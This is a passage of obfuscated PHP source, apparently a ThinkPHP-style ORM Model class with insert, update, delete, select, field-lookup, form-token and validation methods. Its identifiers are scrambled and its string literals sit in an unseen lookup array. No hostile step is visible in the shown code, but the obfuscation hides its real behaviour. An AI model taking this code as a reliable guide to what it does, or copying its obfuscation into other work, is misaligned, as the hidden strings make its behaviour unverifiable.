think_config($ğÄ½ùÀ¿[327]); } if (think_config($ğÄ½ùÀ¿[324])) { $şÂ’Óéö = $this->dbName ? $this->dbName : think_config($ğÄ½ùÀ¿[325]); think_var_cache($ğÄ½ùÀ¿[326] . strtolower(get_path_this($şÂ’Óéö) . $ğÄ½ùÀ¿[10] . $this->name), $this->fields); } } public function switchModel($òç¥†ë×, $ÌÖáœÄ = array()) { $ÑÒáş¡µ =& $_SERVER[™¸œØ®Ü]; $¢ À¾èá = ucwords(strtolower($òç¥†ë×)) . $ÑÒáş¡µ[332]; if (!class_exists($¢ À¾èá)) { think_exception($¢ À¾èá . think_lang($ÑÒáş¡µ[333])); } $this->_extModel = new $¢ À¾èá($this->name); if (!empty($ÌÖáœÄ)) { foreach ($ÌÖáœÄ as $Ş¢İÒ™ë) { $this->_extModel->setProperty($Ş¢İÒ™ë, $this->{$Ş¢İÒ™ë}); } } return $this->_extModel; } public function __set($Ñó·îÉ, $ÓÇíò–Ó) { $this->data[$Ñó·îÉ] = $ÓÇíò–Ó; } public function __get($—ê“íÅ†) { return isset($this->data[$—ê“íÅ†]) ? $this->data[$—ê“íÅ†] : null; } public function __isset($®Ë¸Ø°‡) { return isset($this->data[$®Ë¸Ø°‡]); } public function __unset($¨¸º­±¢) { unset($this->data[$¨¸º­±¢]); } public function __call($´ô¨æú¦, $Êªİì¿ë) { $øƒÖËÎÑ =& $_SERVER[™¸œØ®Ü]; if (in_array(strtolower($´ô¨æú¦), $this->methods, !0)) { $this->options[strtolower($´ô¨æú¦)] = $Êªİì¿ë[0]; return $this; } elseif (in_array(strtolower($´ô¨æú¦), array($øƒÖËÎÑ[334], $øƒÖËÎÑ[335], $øƒÖËÎÑ[336], $øƒÖËÎÑ[337], $øƒÖËÎÑ[338]), !0)) { $ßĞˆÀİ„ = isset($Êªİì¿ë[0]) ? $Êªİì¿ë[0] : $øƒÖËÎÑ[222]; $ßĞˆÀİ„ = $this->db->parseKey($ßĞˆÀİ„); return $this->getField(strtoupper($´ô¨æú¦) . $øƒÖËÎÑ[339] . $ßĞˆÀİ„ . $øƒÖËÎÑ[340] . $´ô¨æú¦, $øƒÖËÎÑ[334]); } elseif (strtolower(substr($´ô¨æú¦, 0, 5)) == $øƒÖËÎÑ[341]) { $ßĞˆÀİ„ = think_parse_name(substr($´ô¨æú¦, 5)); $ŒÌ°“Š×[$ßĞˆÀİ„] = $Êªİì¿ë[0]; return $this->where($ŒÌ°“Š×)->find(); } elseif (strtolower(substr($´ô¨æú¦, 0, 10)) == $øƒÖËÎÑ[342]) { $Í­·åı² = think_parse_name(substr($´ô¨æú¦, 10)); $ŒÌ°“Š×[$Í­·åı²] = $Êªİì¿ë[0]; return $this->where($ŒÌ°“Š×)->getField($Êªİì¿ë[1]); } elseif (isset($this->_scope[$´ô¨æú¦])) { return $this->scope($´ô¨æú¦, $Êªİì¿ë[0]); } elseif (method_exists($this, $´ô¨æú¦)) { array_unshift($Êªİì¿ë, $´ô¨æú¦); return call_user_func_array(array($this, $øƒÖËÎÑ[343]), $Êªİì¿ë); } else { return call_user_func_array(array(parent, $´ô¨æú¦), $Êªİì¿ë); } } protected function call() { $ã‰âÜã½ =& $_SERVER[™¸œØ®Ü]; $¦Æ¥ïÇ» = func_get_args(); $Òû¿ì© = array_shift($¦Æ¥ïÇ»); $ß¸àÙÃµ = $Òû¿ì©; if (is_array($Òû¿ì©)) { $ß¸àÙÃµ = $Òû¿ì©[1]; $Òû¿ì© = $Òû¿ì©[0]; } $ä¶¹¿ = count($¦Æ¥ïÇ») - 1; if (isset($¦Æ¥ïÇ»[$ä¶¹¿]) && $¦Æ¥ïÇ»[$ä¶¹¿] === $Òû¿ì©) { think_exception(__CLASS__ . $ã‰âÜã½[4] . $Òû¿ì© . think_lang($ã‰âÜã½[344])); return; } $¦Æ¥ïÇ»[] = $Òû¿ì©; if (method_exists($this, $ã‰âÜã½[345])) { $»§’“ = call_user_func_array(array($this, $ã‰âÜã½[346]), array($ß¸àÙÃµ, $¦Æ¥ïÇ»)); if (!is_null($»§’“) && $»§’“ !== !1) { return $»§’“; } } $Ù·…ŸÈ = call_user_func_array(array($this, $Òû¿ì©), $¦Æ¥ïÇ»); if (method_exists($this, $ã‰âÜã½[347])) { $»§’“ = call_user_func_array(array($this, $ã‰âÜã½[348]), array($ß¸àÙÃµ, $¦Æ¥ïÇ», $Ù·…ŸÈ)); if ($»§’“) { return $»§’“; } } return $Ù·…ŸÈ; } protected function _initialize() { } protected function _facade($‚„Úµ¼‘) { $ÛÑ«ô˜ò =& $_SERVER[™¸œØ®Ü]; if (!empty($this->fields)) { foreach ($‚„Úµ¼‘ as $ıÀĞ”Åº => $Ÿéíâ¤’) { if (is_array($this->fields) && !in_array($ıÀĞ”Åº, $this->fields, !0)) { unset($‚„Úµ¼‘[$ıÀĞ”Åº]); } elseif (is_scalar($Ÿéíâ¤’)) { $this->_parseType($‚„Úµ¼‘, $ıÀĞ”Åº); } } } if (!empty($this->options[$ÛÑ«ô˜ò[349]])) { $‚„Úµ¼‘ = array_map($this->options[$ÛÑ«ô˜ò[349]], $‚„Úµ¼‘); unset($this->options[$ÛÑ«ô˜ò[349]]); } $this->_beforeWrite($‚„Úµ¼‘); return $‚„Úµ¼‘; } protected function _beforeWrite(&$Õ÷„æñ) { } public function add($üšÜƒÉÚ = '', $£Éè°éä = array(), $î¨ö•èè = false) { if (empty($üšÜƒÉÚ)) { if (!empty($this->data)) { $üšÜƒÉÚ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[™¸œØ®Ü][350]); return !1; } } $£Éè°éä = $this->_parseOptions($£Éè°éä); $üšÜƒÉÚ = $this->_facade($üšÜƒÉÚ); if (!1 === $this->_beforeInsert($üšÜƒÉÚ, $£Éè°éä)) { return !1; } $ÄÎı‘“ú = $this->db->insert($üšÜƒÉÚ, $£Éè°éä, $î¨ö•èè); if (!1 !== $ÄÎı‘“ú) { $±îÆ„ÉÓ = $this->getLastInsID(); if ($±îÆ„ÉÓ) { $üšÜƒÉÚ[$this->getPk()] = $±îÆ„ÉÓ; $this->_after_insert($üšÜƒÉÚ, $£Éè°éä); return $±îÆ„ÉÓ; } $this->_after_insert($üšÜƒÉÚ, $£Éè°éä); } return $ÄÎı‘“ú; } protected function _beforeInsert(&$  ƒ¦©ï, $¼¬•ŸÁ) { } protected function _after_insert($„‡¼¿·Ù, $óà‘•§) { } public function addAll($¿¸š§üä, $ïš€á³ = array(), $Ÿ•ÀÁ˜Ü = false) { $ü²¹Åµ =& $_SERVER[™¸œØ®Ü]; if (empty($¿¸š§üä)) { $this->error = think_lang($ü²¹Åµ[350]); return !1; } $ïš€á³ = $this->_parseOptions($ïš€á³); foreach ($¿¸š§üä as $¨šÁñüâ => $¶é¬È·­) { $¿¸š§üä[$¨šÁñüâ] = $this->_facade($¶é¬È·­); } if (method_exists($this->db, $ü²¹Åµ[351])) { $æÄåí–° = $this->db->insertAll($¿¸š§üä, $ïš€á³, $Ÿ•ÀÁ˜Ü); } else { $this->startTrans(); foreach ($¿¸š§üä as $¨šÁñüâ => $¶é¬È·­) { $æÄåí–° = $this->db->insert($¶é¬È·­, $ïš€á³, $Ÿ•ÀÁ˜Ü); } $this->commit(); } if (!1 !== $æÄåí–°) { $„®âš = $this->getLastInsID(); if ($„®âš) { return $„®âš; } } return $æÄåí–°; } public function selectAdd($Ä¶ƒìµÚ = '', $‹¡ÅÍ¨ = '', $ÇÑûÂÛ = array()) { $§È›¿ã =& $_SERVER[™¸œØ®Ü]; $ÇÑûÂÛ = $this->_parseOptions($ÇÑûÂÛ); if (!1 === ($¹È½ÖØ = $this->db->selectInsert($Ä¶ƒìµÚ ? $Ä¶ƒìµÚ : $ÇÑûÂÛ[$§È›¿ã[352]], $‹¡ÅÍ¨ ? $‹¡ÅÍ¨ : $this->getTableName(), $ÇÑûÂÛ))) { $this->error = think_lang($§È›¿ã[353]); return !1; } else { return $¹È½ÖØ; } } public function save($Ú§Úİ¬ = '', $Üİ„â³Ù = array()) { $§«ËÀ—¾ =& $_SERVER[™¸œØ®Ü]; if (empty($Ú§Úİ¬)) { if (!empty($this->data)) { $Ú§Úİ¬ = $this->data; $this->data = array(); } else { $this->error = think_lang($§«ËÀ—¾[350]); return !1; } } $Ú§Úİ¬ = $this->_facade($Ú§Úİ¬); $Üİ„â³Ù = $this->_parseOptions($Üİ„â³Ù); $œ¥ÜÆ = $this->getPk(); if (!isset($Üİ„â³Ù[$§«ËÀ—¾[354]])) { if (isset($Ú§Úİ¬[$œ¥ÜÆ])) { $îä”èî¯[$œ¥ÜÆ] = $Ú§Úİ¬[$œ¥ÜÆ]; $Üİ„â³Ù[$§«ËÀ—¾[354]] = $îä”èî¯; unset($Ú§Úİ¬[$œ¥ÜÆ]); } else { $this->error = think_lang($§«ËÀ—¾[353]); return !1; } } if (is_array($Üİ„â³Ù[$§«ËÀ—¾[354]]) && isset($Üİ„â³Ù[$§«ËÀ—¾[354]][$œ¥ÜÆ])) { $ê¾ ŞÚÑ = $Üİ„â³Ù[$§«ËÀ—¾[354]][$œ¥ÜÆ]; } if (!1 === $this->_beforeUpdate($Ú§Úİ¬, $Üİ„â³Ù)) { return !1; } $€¢…Ñ˜Ç = $this->db->update($Ú§Úİ¬, $Üİ„â³Ù); if (!1 !== $€¢…Ñ˜Ç) { if (isset($ê¾ ŞÚÑ)) { $Ú§Úİ¬[$œ¥ÜÆ] = $ê¾ ŞÚÑ; } $this->_afterUpdate($Ú§Úİ¬, $Üİ„â³Ù); } return $€¢…Ñ˜Ç; } protected function _beforeUpdate(&$í—èìéÆ, $±‹ØÏ»‘) { } protected function _afterUpdate($Ø€¤€ùÚ, $ˆ¬ãËĞâ) { } public function delete($Îİ®¿ä˜ = array()) { $ûŠí¬ŸÆ =& $_SERVER[™¸œØ®Ü]; if (empty($Îİ®¿ä˜) && empty($this->options[$ûŠí¬ŸÆ[354]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $äÔÀõË‘ = $this->getPk(); if (is_numeric($Îİ®¿ä˜) || is_string($Îİ®¿ä˜)) { if (strpos($Îİ®¿ä˜, $ûŠí¬ŸÆ[50])) { $‚£ÍûÚù[$äÔÀõË‘] = array($ûŠí¬ŸÆ[355], $Îİ®¿ä˜); } else { $‚£ÍûÚù[$äÔÀõË‘] = $Îİ®¿ä˜; } $this->options[$ûŠí¬ŸÆ[354]] = $‚£ÍûÚù; } $Îİ®¿ä˜ = $this->_parseOptions(); if (is_array($Îİ®¿ä˜[$ûŠí¬ŸÆ[354]]) && isset($Îİ®¿ä˜[$ûŠí¬ŸÆ[354]][$äÔÀõË‘])) { $ç¸â­ŠÀ = $Îİ®¿ä˜[$ûŠí¬ŸÆ[354]][$äÔÀõË‘]; } $²‹Ø»íÛ = $this->db->delete($Îİ®¿ä˜); if (!1 !== $²‹Ø»íÛ) { $ì†œÖ„ = array(); if (isset($ç¸â­ŠÀ)) { $ì†œÖ„[$äÔÀõË‘] = $ç¸â­ŠÀ; } $this->_after_delete($ì†œÖ„, $Îİ®¿ä˜); } return $²‹Ø»íÛ; } protected function _after_delete($£ıóöº, $®ÙŠğ) { } public function select($…ÕÑÔ‰ = array()) { $åÉ¼ºë =& $_SERVER[™¸œØ®Ü]; if (is_string($…ÕÑÔ‰) || is_numeric($…ÕÑÔ‰)) { $“İˆğç” = $this->getPk(); if (strpos($…ÕÑÔ‰, $åÉ¼ºë[50])) { $ˆŸÌª¾[$“İˆğç”] = array($åÉ¼ºë[355], $…ÕÑÔ‰); } else { $ˆŸÌª¾[$“İˆğç”] = $…ÕÑÔ‰; } $this->options[$åÉ¼ºë[354]] = $ˆŸÌª¾; } elseif (!1 === $…ÕÑÔ‰) { $…ÕÑÔ‰ = $this->_parseOptions(); return $åÉ¼ºë[356] . $this->db->buildSelectSql($…ÕÑÔ‰) . $åÉ¼ºë[357]; } $…ÕÑÔ‰ = $this->_parseOptions(); $‰Ñ£œÒù = $this->db->select($…ÕÑÔ‰); if (!1 === $‰Ñ£œÒù) { return !1; } if (empty($‰Ñ£œÒù)) { return null; } $this->_afterSelect($‰Ñ£œÒù, $…ÕÑÔ‰); return $‰Ñ£œÒù; } protected function _afterSelect(&$Äğß´¥Ö, $¾¦Ãèï”) { } public function buildSql($·™åºí = array()) { $ÙÈ­Ş™ =& $_SERVER[™¸œØ®Ü]; $·™åºí = $this->_parseOptions($·™åºí); return $ÙÈ­Ş™[356] . $this->db->buildSelectSql($·™åºí) . $ÙÈ­Ş™[357]; } public function optionsValue($×½ÆñÒˆ = null) { if (is_null($×½ÆñÒˆ)) { return $this->options; } elseif (is_array($×½ÆñÒˆ)) { $this->options = array_merge($this->options, $×½ÆñÒˆ); } } protected function _parseOptions($£ıÚ• = array()) { $ëœç˜è› =& $_SERVER[™¸œØ®Ü]; if (is_array($£ıÚ•)) { $£ıÚ• = array_merge($this->options, $£ıÚ•); } $this->options = array(); if (!isset($£ıÚ•[$ëœç˜è›[358]])) { $£ıÚ•[$ëœç˜è›[358]] = $this->getTableName(); $ÉÀ¬÷”É = $this->fields; } else { $ÉÀ¬÷”É = $this->getDbFields(); } if (!empty($£ıÚ•[$ëœç˜è›[359]])) { $£ıÚ•[$ëœç˜è›[358]] .= $ëœç˜è›[53] . $£ıÚ•[$ëœç˜è›[359]]; } $£ıÚ•[$ëœç˜è›[360]] = $this->name; if (isset($£ıÚ•[$ëœç˜è›[354]]) && is_array($£ıÚ•[$ëœç˜è›[354]]) && !empty($ÉÀ¬÷”É) && !isset($£ıÚ•[$ëœç˜è›[361]]) && !isset($£ıÚ•[$ëœç˜è›[358]])) { foreach ($£ıÚ•[$ëœç˜è›[354]] as $†ûª·Ñ• => $ê»‘ì) { $†ûª·Ñ• = trim($†ûª·Ñ•); if (in_array($†ûª·Ñ•, $ÉÀ¬÷”É, !0)) { if (is_scalar($ê»‘ì)) { $this->_parseType($£ıÚ•[$ëœç˜è›[354]], $†ûª·Ñ•); } } elseif (!is_numeric($†ûª·Ñ•) && $ëœç˜è›[11] != substr($†ûª·Ñ•, 0, 1) && !1 === strpos($†ûª·Ñ•, $ëœç˜è›[10]) && !1 === strpos($†ûª·Ñ•, $ëœç˜è›[339]) && !1 === strpos($†ûª·Ñ•, $ëœç˜è›[214]) && !1 === strpos($†ûª·Ñ•, $ëœç˜è›[286])) { unset($£ıÚ•[$ëœç˜è›[354]][$†ûª·Ñ•]); } } } $this->_options_filter($£ıÚ•); return $£ıÚ•; } protected function _options_filter(&$§õÏœóƒ) { } protected function _parseType(&$œ‚´›ñÎ, $ï¿°­å£) { $”Åúš“» =& $_SERVER[™¸œØ®Ü]; if (empty($this->options[$”Åúš“»[362]][$”Åúš“»[4] . $ï¿°­å£])) { $‰‚¼ÖÂ¼ = strtolower($this->fields[$”Åúš“»[331]][$ï¿°­å£]); if (!1 !== strpos($‰‚¼ÖÂ¼, $”Åúš“»[363])) { } elseif (!1 === strpos($‰‚¼ÖÂ¼, $”Åúš“»[364]) && !1 !== strpos($‰‚¼ÖÂ¼, $”Åúš“»[365])) { $œ‚´›ñÎ[$ï¿°­å£] = intval($œ‚´›ñÎ[$ï¿°­å£]); } elseif (!1 !== strpos($‰‚¼ÖÂ¼, $”Åúš“»[366]) || !1 !== strpos($‰‚¼ÖÂ¼, $”Åúš“»[367])) { $œ‚´›ñÎ[$ï¿°­å£] = floatval($œ‚´›ñÎ[$ï¿°­å£]); } elseif (!1 !== strpos($‰‚¼ÖÂ¼, $”Åúš“»[368])) { $œ‚´›ñÎ[$ï¿°­å£] = (bool) $œ‚´›ñÎ[$ï¿°­å£]; } } } public function find($–ã›¤ = array()) { $Ÿ—˜èê =& $_SERVER[™¸œØ®Ü]; if (is_numeric($–ã›¤) || is_string($–ã›¤)) { $­ûëıóà[$this->getPk()] = intval($–ã›¤); $this->options[$Ÿ—˜èê[354]] = $­ûëıóà; } $this->options[$Ÿ—˜èê[369]] = 1; $–ã›¤ = $this->_parseOptions(); $ª¤ñ¶ğİ = $this->db->select($–ã›¤); if (!1 === $ª¤ñ¶ğİ) { return !1; } if (empty($ª¤ñ¶ğİ)) { return null; } $this->data = $ª¤ñ¶ğİ[0]; $this->_afterFind($this->data, $–ã›¤); if (!empty($this->options[$Ÿ—˜èê[370]])) { return $this->returnResult($this->data, $this->options[$Ÿ—˜èê[370]]); } return $this->data; } protected function _afterFind(&$ÇİŠ‚§Í, $ÏÇÚŞâ) { } protected function returnResult($‹óäË‰, $éòî±¡Ò = '') { $¸Ôæí©ä =& $_SERVER[™¸œØ®Ü]; if ($éòî±¡Ò) { if (is_callable($éòî±¡Ò)) { return call_user_func($éòî±¡Ò, $‹óäË‰); } switch (strtolower($éòî±¡Ò)) { case $¸Ôæí©ä[371]: return json_encode($‹óäË‰); case $¸Ôæí©ä[372]: return xml_encode($‹óäË‰); } } return $‹óäË‰; } public function parseFieldsMap($Å›»š…, $œ›½’Ë = 1) { if (!empty($this->_map)) { foreach ($this->_map as $üãôô¢ => $¨´æ‹) { if ($œ›½’Ë == 1) { if (isset($Å›»š…[$¨´æ‹])) { $Å›»š…[$üãôô¢] = $Å›»š…[$¨´æ‹]; unset($Å›»š…[$¨´æ‹]); } } else { if (isset($Å›»š…[$üãôô¢])) { $Å›»š…[$¨´æ‹] = $Å›»š…[$üãôô¢]; unset($Å›»š…[$üãôô¢]); } } } } return $Å›»š…; } public function setField($µóî¾şÔ, $êöÖ¸¯š = '') { if (is_array($µóî¾şÔ)) { $äó”œ­ï = $µóî¾şÔ; } else { $äó”œ­ï[$µóî¾şÔ] = $êöÖ¸¯š; } return $this->save($äó”œ­ï); } public function setAdd($êè‰§ü, $éÕ¤ˆ…É = 1) { $õ…ëØÎÒ =& $_SERVER[™¸œØ®Ü]; $àƒ…ŞÆ = $êè‰§ü . $õ…ëØÎÒ[373] . $éÕ¤ˆ…É; if ($éÕ¤ˆ…É < 0) { $àƒ…ŞÆ = $êè‰§ü . $éÕ¤ˆ…É; } return $this->setField($êè‰§ü, array($õ…ëØÎÒ[374], $àƒ…ŞÆ)); } public function getField($º«³îì, $ëşÆÌÖÈ = null) { $«ÀÌé®á =& $_SERVER[™¸œØ®Ü]; $ïãËÏç¿[$«ÀÌé®á[352]] = $º«³îì; $ïãËÏç¿ = $this->_parseOptions($ïãËÏç¿); $º«³îì = trim($º«³îì); if (strpos($º«³îì, $«ÀÌé®á[50])) { if (!isset($ïãËÏç¿[$«ÀÌé®á[369]])) { $ïãËÏç¿[$«ÀÌé®á[369]] = is_numeric($ëşÆÌÖÈ) ? $ëşÆÌÖÈ : $«ÀÌé®á[12]; } $ƒ¬âÕÍ = $this->db->select($ïãËÏç¿); if (!empty($ƒ¬âÕÍ)) { $´Å×ï— = explode($«ÀÌé®á[50], $º«³îì); $º«³îì = array_keys($ƒ¬âÕÍ[0]); $œûŒÖé  = array_shift($º«³îì); $¦¯¨ó ñ = array_shift($º«³îì); $Ş„˜µ©è = array(); $µâÙª–è = count($´Å×ï—); foreach ($ƒ¬âÕÍ as $éş‰¦¿) { $²¦å˜Ä = $éş‰¦¿[$œûŒÖé ]; if (2 == $µâÙª–è) { $Ş„˜µ©è[$²¦å˜Ä] = $éş‰¦¿[$¦¯¨ó ñ]; } else { $Ş„˜µ©è[$²¦å˜Ä] = is_string($ëşÆÌÖÈ) ? implode($ëşÆÌÖÈ, $éş‰¦¿) : $éş‰¦¿; } } return $Ş„˜µ©è; } } else { if (!0 !== $ëşÆÌÖÈ) { $ïãËÏç¿[$«ÀÌé®á[369]] = is_numeric($ëşÆÌÖÈ) ? $ëşÆÌÖÈ : 1; } if ($ëşÆÌÖÈ === $«ÀÌé®á[334]) { unset($ïãËÏç¿[$«ÀÌé®á[369]]); } $éş‰¦¿ = $this->db->select($ïãËÏç¿); if (!empty($éş‰¦¿)) { if ($ëşÆÌÖÈ === $«ÀÌé®á[334]) { return reset($éş‰¦¿[0]); } if (!0 !== $ëşÆÌÖÈ && 1 == $ïãËÏç¿[$«ÀÌé®á[369]]) { return reset($éş‰¦¿[0]); } foreach ($éş‰¦¿ as $ÅôéÑ²) { $€ªØ•ÓË[] = $ÅôéÑ²[$º«³îì]; } return $€ªØ•ÓË; } } return null; } public function create($î÷­¸ÛÉ = '', $ë´„ÎÆÁ = '') { $ü¯ï¤–Ä =& $_SERVER[™¸œØ®Ü]; if (empty($î÷­¸ÛÉ)) { $î÷­¸ÛÉ = $_POST; } elseif (is_object($î÷­¸ÛÉ)) { $î÷­¸ÛÉ = get_object_vars($î÷­¸ÛÉ); } if (empty($î÷­¸ÛÉ) || !is_array($î÷­¸ÛÉ)) { $this->error = think_lang($ü¯ï¤–Ä[350]); return !1; } $î÷­¸ÛÉ = $this->parseFieldsMap($î÷­¸ÛÉ, 0); $ë´„ÎÆÁ = $ë´„ÎÆÁ ? $ë´„ÎÆÁ : (!empty($î÷­¸ÛÉ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ü¯ï¤–Ä[352]])) { $‚âÈÀü¿ = $this->options[$ü¯ï¤–Ä[352]]; unset($this->options[$ü¯ï¤–Ä[352]]); } elseif ($ë´„ÎÆÁ == THINK_MODEL_INSERT && isset($this->insertFields)) { $‚âÈÀü¿ = $this->insertFields; } elseif ($ë´„ÎÆÁ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $‚âÈÀü¿ = $this->updateFields; } if (isset($‚âÈÀü¿)) { if (is_string($‚âÈÀü¿)) { $‚âÈÀü¿ = explode($ü¯ï¤–Ä[50], $‚âÈÀü¿); } if (think_config($ü¯ï¤–Ä[375])) { $‚âÈÀü¿[] = think_config($ü¯ï¤–Ä[376]); } foreach ($î÷­¸ÛÉ as $ê—¹ºéö => $‹Á¯¢Ë) { if (!in_array($ê—¹ºéö, $‚âÈÀü¿)) { unset($î÷­¸ÛÉ[$ê—¹ºéö]); } } } if (!$this->autoValidation($î÷­¸ÛÉ, $ë´„ÎÆÁ)) { return !1; } if (!$this->autoCheckToken($î÷­¸ÛÉ)) { $this->error = think_lang($ü¯ï¤–Ä[377]); return !1; } if ($this->autoCheckFields) { $‚âÈÀü¿ = $this->getDbFields(); foreach ($î÷­¸ÛÉ as $ê—¹ºéö => $‹Á¯¢Ë) { if (!in_array($ê—¹ºéö, $‚âÈÀü¿)) { unset($î÷­¸ÛÉ[$ê—¹ºéö]); } elseif (MAGIC_QUOTES_GPC && is_string($‹Á¯¢Ë)) { $î÷­¸ÛÉ[$ê—¹ºéö] = stripslashes($‹Á¯¢Ë); } } } $this->autoOperation($î÷­¸ÛÉ, $ë´„ÎÆÁ); $this->data = $î÷­¸ÛÉ; return $î÷­¸ÛÉ; } public function autoCheckToken($²Ø¾£ÑÚ) { $ÖÇÓ£Ù‚ =& $_SERVER[™¸œØ®Ü]; if (isset($this->options[$ÖÇÓ£Ù‚[378]]) && !$this->options[$ÖÇÓ£Ù‚[378]]) { return !0; } if (think_config($ÖÇÓ£Ù‚[375])) { $º‚İ‡¶ = think_config($ÖÇÓ£Ù‚[376]); if (!isset($²Ø¾£ÑÚ[$º‚İ‡¶]) || Session::get($º‚İ‡¶)) { return !1; } list($È öî¦ˆ, $ıº°¦…ò) = explode($ÖÇÓ£Ù‚[11], $²Ø¾£ÑÚ[$º‚İ‡¶]); if ($ıº°¦…ò && Session::get($º‚İ‡¶ . $ÖÇÓ£Ù‚[10] . $È öî¦ˆ) === $ıº°¦…ò) { Session::remove($º‚İ‡¶ . $ÖÇÓ£Ù‚[10] . $È öî¦ˆ); return !0; } if (think_config($ÖÇÓ£Ù‚[379])) { Session::remove($º‚İ‡¶ . $ÖÇÓ£Ù‚[10] . $È öî¦ˆ); } return !1; } return !0; } public function regex($À½•Şø, $ï®˜«‡) { $¤´Êş¨ =& $_SERVER[™¸œØ®Ü]; $ï”Óû­ê = array($¤´Êş¨[380] => $¤´Êş¨[381], $¤´Êş¨[382] => $¤´Êş¨[383], $¤´Êş¨[384] => $¤´Êş¨[385], $¤´Êş¨[386] => $¤´Êş¨[387], $¤´Êş¨[388] => $¤´Êş¨[389], $¤´Êş¨[390] => $¤´Êş¨[391], $¤´Êş¨[392] => $¤´Êş¨[393], $¤´Êş¨[367] => $¤´Êş¨[394], $¤´Êş¨[395] => $¤´Êş¨[396]); if (isset($ï”Óû­ê[strtolower($ï®˜«‡)])) { $ï®˜«‡ = $ï”Óû­ê[strtolower($ï®˜«‡)]; } return preg_match($ï®˜«‡, $À½•Şø) === 1; } private function autoOperation(&$ÉÈ¿ÓÍì, $¢ÓèâÙ­) { $ê“ÚÆÍ¾ =& $_SERVER[™¸œØ®Ü]; if (!empty($this->options[$ê“ÚÆÍ¾[397]])) { $éÌÖ¶×Û = $this->options[$ê“ÚÆÍ¾[397]]; unset($this->options[$ê“ÚÆÍ¾[397]]); } elseif (!empty($this->_auto)) { $éÌÖ¶×Û = $this->_auto; } if (isset($éÌÖ¶×Û)) { foreach ($éÌÖ¶×Û as $šŒõ¶¡Ö) { if (empty($šŒõ¶¡Ö[2])) { $šŒõ¶¡Ö[2] = THINK_MODEL_INSERT; } if ($¢ÓèâÙ­ == $šŒõ¶¡Ö[2] || $šŒõ¶¡Ö[2] == THINK_MODEL_BOTH) { switch (trim($šŒõ¶¡Ö[3])) { case $ê“ÚÆÍ¾[398]: case $ê“ÚÆÍ¾[399]: $ùí˜÷ã˜ = isset($šŒõ¶¡Ö[4]) ? (array) $šŒõ¶¡Ö[4] : array(); if (isset($ÉÈ¿ÓÍì[$šŒõ¶¡Ö[0]])) { array_unshift($ùí˜÷ã˜, $ÉÈ¿ÓÍì[$šŒõ¶¡Ö[0]]); } if ($ê“ÚÆÍ¾[398] == $šŒõ¶¡Ö[3]) { $ÉÈ¿ÓÍì[$šŒõ¶¡Ö[0]] = call_user_func_array($šŒõ¶¡Ö[1], $ùí˜÷ã˜); } else { $ÉÈ¿ÓÍì[$šŒõ¶¡Ö[0]] = call_user_func_array(array(&$this, $šŒõ¶¡Ö[1]), $ùí˜÷ã˜); } break; case $ê“ÚÆÍ¾[352]: $ÉÈ¿ÓÍì[$šŒõ¶¡Ö[0]] = $ÉÈ¿ÓÍì[$šŒõ¶¡Ö[1]]; break; case $ê“ÚÆÍ¾[400]: if ($ê“ÚÆÍ¾[12] === $ÉÈ¿ÓÍì[$šŒõ¶¡Ö[0]]) { unset($ÉÈ¿ÓÍì[$šŒõ¶¡Ö[0]]); } break; case $ê“ÚÆÍ¾[401]: default: $ÉÈ¿ÓÍì[$šŒõ¶¡Ö[0]] = $šŒõ¶¡Ö[1]; } if (!1 === $ÉÈ¿ÓÍì[$šŒõ¶¡Ö[0]]) { unset($ÉÈ¿ÓÍì[$šŒõ¶¡Ö[0]]); } } } } return $ÉÈ¿ÓÍì; } protected function autoValidation($‚”ôšŠ¨, $‚ú·ˆê¯) { $œõñ‘òŠ =& $_SERVER[™¸œØ®Ü]; if (!empty($this->options[$œõñ‘òŠ[402]])) { $ÈĞÛÌË = $this->options[$œõñ‘òŠ[402]]; unset($this->options[$œõñ‘òŠ[402]]); } elseif (!empty($this->_validate)) { $ÈĞÛÌË = $this->_validate; } if (isset($ÈĞÛÌË)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÈĞÛÌË as $À¦˜“Ó” => $œ¡İÉÊü) { if (empty($œ¡İÉÊü[5]) || $œ¡İÉÊü[5] == THINK_MODEL_BOTH || $œ¡İÉÊü[5] == $‚ú·ˆê¯) { if (0 == strpos($œ¡İÉÊü[2], $œõñ‘òŠ[403]) && strpos($œ¡İÉÊü[2], $œõñ‘òŠ[404])) { $œ¡İÉÊü[2] = think_lang(substr($œ¡İÉÊü[2], 2, -1)); } $œ¡İÉÊü[3] = isset($œ¡İÉÊü[3]) ? $œ¡İÉÊü[3] : THINK_EXISTS_VALIDATE; $œ¡İÉÊü[4] = isset($œ¡İÉÊü[4]) ? $œ¡İÉÊü[4] : $œõñ‘òŠ[405]; switch ($œ¡İÉÊü[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($‚”ôšŠ¨, $œ¡İÉÊü)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($œõñ‘òŠ[12] != trim($‚”ôšŠ¨[$œ¡İÉÊü[0]])) { if (!1 === $this->_validationField($‚”ôšŠ¨, $œ¡İÉÊü)) { return !1; } } break; default: if (isset($‚”ôšŠ¨[$œ¡İÉÊü[0]])) { if (!1 === $this->_validationField($‚”ôšŠ¨, $œ¡İÉÊü)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($°Ö±…¢³, $íó÷ÚİÒ) { if (!1 === $this->_validationFieldItem($°Ö±…¢³, $íó÷ÚİÒ)) { if ($this->patchValidate) { $this->error[$íó÷ÚİÒ[0]] = $íó÷ÚİÒ[2]; } else { $this->error = $íó÷ÚİÒ[2]; return !1; } } return; } protected function _validationFieldItem($ùëÆÏéƒ, $ä¶ÉÂÀ‚) { $–“ÓÚ…¹ =& $_SERVER[™¸œØ®Ü]; switch (strtolower(trim($ä¶ÉÂÀ‚[4]))) { case $–“ÓÚ…¹[398]: case $–“ÓÚ…¹[399]: $ÅÈÍÕ•€ = isset($ä¶ÉÂÀ‚[6]) ? (array) $ä¶ÉÂÀ‚[6] : array(); if (is_string($ä¶ÉÂÀ‚[0]) && strpos($ä¶ÉÂÀ‚[0], $–“ÓÚ…¹[50])) { $ä¶ÉÂÀ‚[0] = explode($–“ÓÚ…¹[50], $ä¶ÉÂÀ‚[0]); } if (is_array($ä¶ÉÂÀ‚[0])) { foreach ($ä¶ÉÂÀ‚[0] as $ãÕÔ•®) { $‹—Áš×¼[$ãÕÔ•®] = 